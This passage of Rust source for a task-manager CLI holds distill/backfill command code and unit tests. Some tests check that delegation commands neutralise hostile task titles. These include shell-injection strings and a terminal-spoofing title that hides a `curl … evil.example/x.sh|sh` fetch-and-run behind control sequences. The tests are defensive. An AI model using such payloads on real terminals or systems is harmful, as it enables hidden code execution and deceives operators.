            // Another holder has the run lock (usually the timer). Nothing was
            // consumed; the library recorded `distill.skipped`.
            println!(
                "{}",
                ui::section("distill skipped", ui::Ink::Slate, &e.to_string())
            );
            match e.downcast_ref::<ptask_distill::pipeline::DistillBusy>() {
                Some(busy) => distill_skip_verdict(busy),
                None => Ok(()),
            }
        }
        Err(e) => {
            ptask_distill::pipeline::record_failure(db, provider_name, &e);
            // The fail-closed run is precisely the one on which rows cross the
            // ceiling, so the quarantine count matters MORE here than on the Ok
            // path. run_native returns Err without a report, so read the count
            // from the database directly. A failure to read it must not mask
            // the real error, hence the silent fallback.
            match ptask_core::raw_items::quarantined_count(db) {
                Ok(n) if n > 0 => eprintln!(
                    "  {} capture(s) quarantined after {} failed attempts — \
                     inspect: SELECT id, distill_error FROM raw_items \
                     WHERE processed=0 AND distill_attempts>={}",
                    n,
                    ptask_core::raw_items::MAX_DISTILL_ATTEMPTS,
                    ptask_core::raw_items::MAX_DISTILL_ATTEMPTS
                ),
                _ => {}
            }
            anyhow::bail!("distill native FAILED (fail closed): {e:#}")
        }
    }
}

/// Consecutive skipped runs after which `pt distill` exits non-zero.
const MAX_CONSECUTIVE_DISTILL_SKIPS: usize = 3;

/// Exit status of a skipped run: fine once or twice (a manual run overlapping
/// the timer), a failure from the third consecutive skip on. Anyone who can
/// read the database directory can hold the lock (another database's
/// distill in the same directory, a stray process), and a silent exit 0
/// would hide that forever.
fn distill_skip_verdict(busy: &ptask_distill::pipeline::DistillBusy) -> Result<()> {
    if busy.consecutive_skips >= MAX_CONSECUTIVE_DISTILL_SKIPS {
        anyhow::bail!(
            "distill skipped {} consecutive runs — the run lock on {} is held by \
             another process (another distill, or another database's distill in the \
             same directory); find it with `fuser -v {}` or move the database",
            busy.consecutive_skips,
            busy.lock,
            busy.lock
        );
    }
    Ok(())
}

fn cmd_distill(db: &Db, a: DistillArgs) -> Result<()> {
    cmd_distill_native(db, a.batch)
}

fn cmd_backfill(db: &Db) -> Result<()> {
    let n = pt_id::backfill_all(db)?;
    println!(
        "{}",
        ui::section(
            "backfill",
            ui::Ink::Green,
            &format!("PT-N assigned to {n} task(s)")
        )
    );
    let promoted = ptask_core::convert::promote_subtasks_once(db)?;
    if promoted > 0 {
        println!(
            "{}",
            ui::note(&format!(
                "promoted {promoted} subtask(s) to child tasks (schema v2 one-shot)"
            ))
        );
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    /// Regression (round 5): a held run lock made every `pt distill` skip
    /// with exit 0, forever. Three consecutive skips now fail the unit so
    /// the OnFailure alert fires.
    #[test]
    fn three_consecutive_distill_skips_exit_non_zero() {
        let busy = |n| ptask_distill::pipeline::DistillBusy {
            lock: "/srv/pt".into(),
            consecutive_skips: n,
        };
        super::distill_skip_verdict(&busy(1)).unwrap();
        super::distill_skip_verdict(&busy(2)).unwrap();
        let err = super::distill_skip_verdict(&busy(3)).unwrap_err();
        assert!(err.to_string().contains("3 consecutive"), "{err:#}");
    }

    /// Regression (round 2, DIST-8): during quiet hours (22:00-08:00 London)
    /// the command returned Ok before the email-misconfiguration bail, so a
    /// bad address exited 0 for ten hours a day.
    #[test]
    fn email_misconfiguration_fails_the_run_even_in_quiet_hours() {
        let quiet = ptask_core::accountability::RunReport {
            quiet_hours: true,
            ..Default::default()
        };
        let err =
            super::accountability_verdict(&quiet, Some("invalid NOTIFY_EMAIL \"x\"")).unwrap_err();
        assert!(err.to_string().contains("email misconfigured"), "{err:#}");
        super::accountability_verdict(&quiet, None).unwrap();
        let dead = ptask_core::accountability::RunReport {
            eligible: 2,
            send_failures: 3,
            ..Default::default()
        };
        assert!(super::accountability_verdict(&dead, None).is_err());
    }

    use super::{
        ExportArgs, cmd_export, delegation_command, gcalendar_path, git_has_staged_changes,
        plan_window, remote_list_filter, run_git_checked, short_id, stale_review_tasks,
    };

    #[test]
    fn review_rejects_negative_stale_days() {
        // A negative window moved the cutoff into the future, so every task
        // read as stale.
        use clap::Parser;
        assert!(super::Cli::try_parse_from(["pt", "review", "--stale-days=-5"]).is_err());
        assert!(super::Cli::try_parse_from(["pt", "review", "--stale-days", "0"]).is_ok());
    }

    #[test]
    fn rejected_edit_leaves_cli_task_unchanged() {
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("edit.db")).unwrap();
        let task = ptask_core::tasks::create(
            &db,
            ptask_core::NewTask::minimal("original title"),
            &ptask_core::event_log::EventCtx::test(),
        )
        .unwrap();
        let cursor = ptask_core::event_log::current_cursor(&db).unwrap();
        let result = super::cmd_edit(
            &db,
            super::EditArgs {
                query: task.pt_id.clone().unwrap(),
                deadline: Some("not-a-date".into()),
                clear_deadline: false,
                title: Some("changed title".into()),
                desc: None,
                label: vec![],
                unlabel: vec![],
            },
        );
        assert!(result.is_err());
        assert_eq!(
            ptask_core::tasks::resolve_for_lookup(&db, &task.id, true)
                .unwrap()
                .title,
            task.title
        );
        assert_eq!(ptask_core::event_log::current_cursor(&db).unwrap(), cursor);
    }

    #[test]
    fn search_takes_free_text_without_fts_syntax_errors() {
        // Regression (CORE-6): the query went straight to `MATCH`, so
        // `pt search follow-up` failed with "no such column: up", and
        // quotes, PT-ids, c++, ?, %, bare AND/NOT and * all errored.
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("search.db")).unwrap();
        ptask_core::tasks::create(
            &db,
            ptask_core::NewTask::minimal("schedule the follow-up call"),
            &ptask_core::event_log::EventCtx::test(),
        )
        .unwrap();
        for query in [
            "follow-up",
            "\"don't\"",
            "PT-2201",
            "c++",
            "what?",
            "100%",
            "NOT",
            "AND",
            "*",
            "foll*",
        ] {
            super::cmd_search(
                &db,
                super::SearchArgs {
                    query: vec![query.into()],
                    limit: 20,
                },
            )
            .unwrap_or_else(|e| panic!("{query:?}: {e:#}"));
        }
    }

    #[test]
    fn plan_window_rejects_out_of_range_minutes_without_panicking() {
        // `Span::new().minutes(n)` panics outside jiff's range; the minutes
        // come from gcalendar.py output and task durations.
        let start: ptask_core::jiff::Timestamp = "2026-10-06T09:00:00Z".parse().unwrap();
        let (s, e) = plan_window(start, 30, 45).unwrap();
        assert_eq!(s.to_string(), "2026-10-06T09:30:00Z");
        assert_eq!(e.to_string(), "2026-10-06T10:15:00Z");
        assert!(plan_window(start, i64::MAX, 30).is_err());
        assert!(plan_window(start, 0, i64::MAX).is_err());
    }

    #[test]
    fn plan_write_fails_when_calendar_holds_are_not_created() {
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("plan.db")).unwrap();
        ptask_core::tasks::create(
            &db,
            ptask_core::NewTask::minimal("write the plan"),
            &ptask_core::event_log::EventCtx::test(),
        )
        .unwrap();
        // Free/busy works; every `create` fails (the review's fakegcal.py).
        let gcal = dir.path().join("gcalendar.py");
        std::fs::write(
            &gcal,
            "import sys, json\n\
             if 'freebusy' in sys.argv:\n\
             \x20   print(json.dumps({'tz': 'Europe/London', 'free_slots': [{'start': '2026-10-06T08:00:00Z', 'minutes': 480}]}))\n\
             else:\n\
             \x20   sys.exit(1)\n",
        )
        .unwrap();
        let args = |write| super::PlanArgs {
            account: "ops".into(),
            days: 1,
            work: "09:00-18:00".into(),
            tz: "Europe/London".into(),
            calendar: "primary".into(),
            slot_default: 30,
            limit: 20,
            write,
            gcal: Some(gcal.clone()),
        };
        super::cmd_plan(&db, args(false)).expect("the advisory plan itself works");
        let err = super::cmd_plan(&db, args(true)).unwrap_err();
        assert!(format!("{err:#}").contains("1 of 1"), "{err:#}");
    }

    #[test]
    fn bulk_dry_run_rejects_a_bad_priority() {
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("bulk.db")).unwrap();
        ptask_core::tasks::create(
            &db,
            ptask_core::NewTask::minimal("bulk target"),
            &ptask_core::event_log::EventCtx::test(),
        )
        .unwrap();
        let err = super::cmd_bulk(
            &db,
            super::BulkArgs {
                filter: "search: bulk".into(),
                set_priority: Some("bogus".into()),
                done: false,
                dismiss: false,
                note: None,
                dry_run: true,
            },
        )
        .unwrap_err();
        assert!(format!("{err:#}").contains("bogus"), "{err:#}");
    }

    #[test]
    fn review_rejects_an_out_of_range_stale_days_instead_of_panicking() {
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("review.db")).unwrap();
        for stale_days in [99_999_999, i64::MAX, i64::MIN] {
            let err = super::cmd_review(&db, super::ReviewArgs { stale_days }).unwrap_err();
            assert!(format!("{err:#}").contains("--stale-days"), "{err:#}");
        }
    }

    #[test]
    fn gcalendar_default_follows_the_current_home() {
        let home = std::ffi::OsStr::new("/srv/ptask-user");
        assert_eq!(
            gcalendar_path(None, Some(home)).unwrap(),
            std::path::Path::new("/srv/ptask-user/.config/puretensor/gcalendar.py")
        );
    }

    #[test]
    fn gcalendar_explicit_path_does_not_require_home() {
        let explicit = std::path::Path::new("/opt/calendar/gcalendar.py");
        assert_eq!(gcalendar_path(Some(explicit), None).unwrap(), explicit);
    }

    #[test]
    fn delegation_command_round_trips_shell_metacharacters() {
        let title =
            "audit $(printf SUBSTITUTED) `printf BACKTICK` O'Brien \\\nnext; printf INJECTED";
        let handle = "PT-42";
        // The newline folds to a visible mark (it could forge a command
        // line on screen); every shell metacharacter survives the quoting.
        let expected = format!(
            "Work the pTask task {handle}: {}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>.",
            title.replace('\n', "\u{2424}")
        );
        let command = delegation_command(handle, title);
        assert!(!command.contains('\n'), "{command}");
        let script = format!("claude() {{ printf '%s' \"$2\"; }}; {command}");
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .output()
            .unwrap();

        assert!(output.status.success());
        assert_eq!(String::from_utf8(output.stdout).unwrap(), expected);
    }

    #[test]
    fn remote_list_folds_priority_into_the_filter() {
        assert_eq!(remote_list_filter(None, None), None);
        assert_eq!(
            remote_list_filter(Some("today"), None).as_deref(),
            Some("today")
        );
        assert_eq!(remote_list_filter(None, Some(4)).as_deref(), Some("p4"));
        assert_eq!(
            remote_list_filter(Some("today | overdue"), Some(1)).as_deref(),
            Some("(today | overdue) & p1")
        );
        for f in ["p4", "(today | overdue) & p1"] {
            ptask_core::filter::parse(f).unwrap();
        }
    }

    #[test]
    fn delegation_command_cannot_hide_text_from_the_operator() {
        // CR + erase-line repaint a fake double-quoted command over the real
        // prefix; conceal (SGR 8) hides an appended `; curl …|sh` that a
        // terminal selection still copies.
        let title = "rotate nginx logs\r\x1b[2K  claude -p \"Work the pTask task PT-1: rotate nginx logs\"\x1b[8m; curl -s https://evil.example/x.sh|sh #";
        let command = delegation_command("PT-1", title);
        assert!(!command.chars().any(char::is_control), "{command:?}");
        let expected = format!(
            "Work the pTask task PT-1: {}. When done: pt done PT-1; if blocked, pt add the blocker as its own task, then pt depend PT-1 --on <its PT-N>.",
            super::ui::one_line(title)
        );
        let script = format!("claude() {{ printf '%s' \"$2\"; }}; {command}");
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(String::from_utf8(output.stdout).unwrap(), expected);
        // A bidi override cannot reorder the printed command either.
        assert!(!delegation_command("PT-2", "fix \u{202e}hs|lve").contains('\u{202e}'));
    }

    #[test]
    fn delegation_command_quotes_the_complete_prompt() {
        assert_eq!(
            delegation_command("PT-7", "review Alan's quote"),
            "claude -p 'Work the pTask task PT-7: review Alan'\"'\"'s quote. When done: pt done PT-7; if blocked, pt add the blocker as its own task, then pt depend PT-7 --on <its PT-N>.'"
        );
    }

    #[test]
    fn export_git_propagates_commit_failure() {
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("export");
        std::fs::create_dir(&out).unwrap();
        let git = |args: &[&str]| {
            let status = std::process::Command::new("git")
                .args(args)
                .current_dir(&out)
                .status()
                .unwrap();
            assert!(status.success(), "git {args:?} failed");
        };
        git(&["init", "-q"]);
        git(&["config", "user.name", ""]);
        git(&["config", "user.email", ""]);

        let db = ptask_core::Db::open(dir.path().join("tasks.db")).unwrap();
        let error = cmd_export(
            &db,
            ExportArgs {
                out: Some(out),
                git: true,
            },
        )
        .unwrap_err();

        assert!(
            format!("{error:#}").contains("git commit failed"),
            "unexpected error: {error:#}"
        );
    }

    #[test]
    fn export_git_distinguishes_no_change_from_staged_content() {
        let dir = tempfile::tempdir().unwrap();
        run_git_checked(dir.path(), &["init", "-q"]).unwrap();
        assert!(!git_has_staged_changes(dir.path()).unwrap());

        std::fs::write(dir.path().join("tasks.jsonl"), "{}\n").unwrap();
        run_git_checked(dir.path(), &["add", "-A"]).unwrap();
        assert!(git_has_staged_changes(dir.path()).unwrap());
    }

    #[test]
    fn short_id_is_char_boundary_safe() {
        // Normal 36-char UUID → first 8 chars (the common local case).
        assert_eq!(short_id("0123456789abcdef-0000"), "01234567");
        // Shorter than 8 bytes → whole string, no panic (out-of-range slice).
        assert_eq!(short_id("abc"), "abc");
        assert_eq!(short_id(""), "");
        // A remote-supplied id whose byte 8 lands inside a multi-byte scalar
        // must not panic (`&id[..8]` did): "1234567é" has 'é' at bytes 7..9.
        assert_eq!(short_id("1234567é"), "1234567é");
        // Multi-byte chars before byte 8: 'ú' starts at byte 8 (a boundary),
        // so the first 8 bytes are the 4 two-byte scalars "áéíó".
        assert_eq!(short_id("áéíóúab8xyz"), "áéíó");
    }

    #[test]
    fn stale_review_query_compares_instants_across_offsets() {
        let dir = tempfile::tempdir().unwrap();
        let db = ptask_core::Db::open(dir.path().join("review.db")).unwrap();
        let ctx = ptask_core::event_log::EventCtx::test();
        let stale =
            ptask_core::tasks::create(&db, ptask_core::NewTask::minimal("stale"), &ctx).unwrap();
        let fresh =
            ptask_core::tasks::create(&db, ptask_core::NewTask::minimal("fresh"), &ctx).unwrap();
        db.with_conn(|c| {
            c.execute(
                "UPDATE tasks SET updated_at='2026-07-01T10:30:00Z' WHERE id=?1",
                [&stale.id],
            )?;
            c.execute(
                "UPDATE tasks SET updated_at='2026-07-01T11:30:00Z' WHERE id=?1",
                [&fresh.id],
            )?;
            Ok(())
        })
        .unwrap();

        let rows = stale_review_tasks(&db, "2026-07-01T12:00:00+01:00").unwrap();
        let ids: Vec<&str> = rows.iter().map(|row| row.0.as_str()).collect();
        assert!(ids.contains(&stale.id.as_str()));
        assert!(!ids.contains(&fresh.id.as_str()));
    }
}
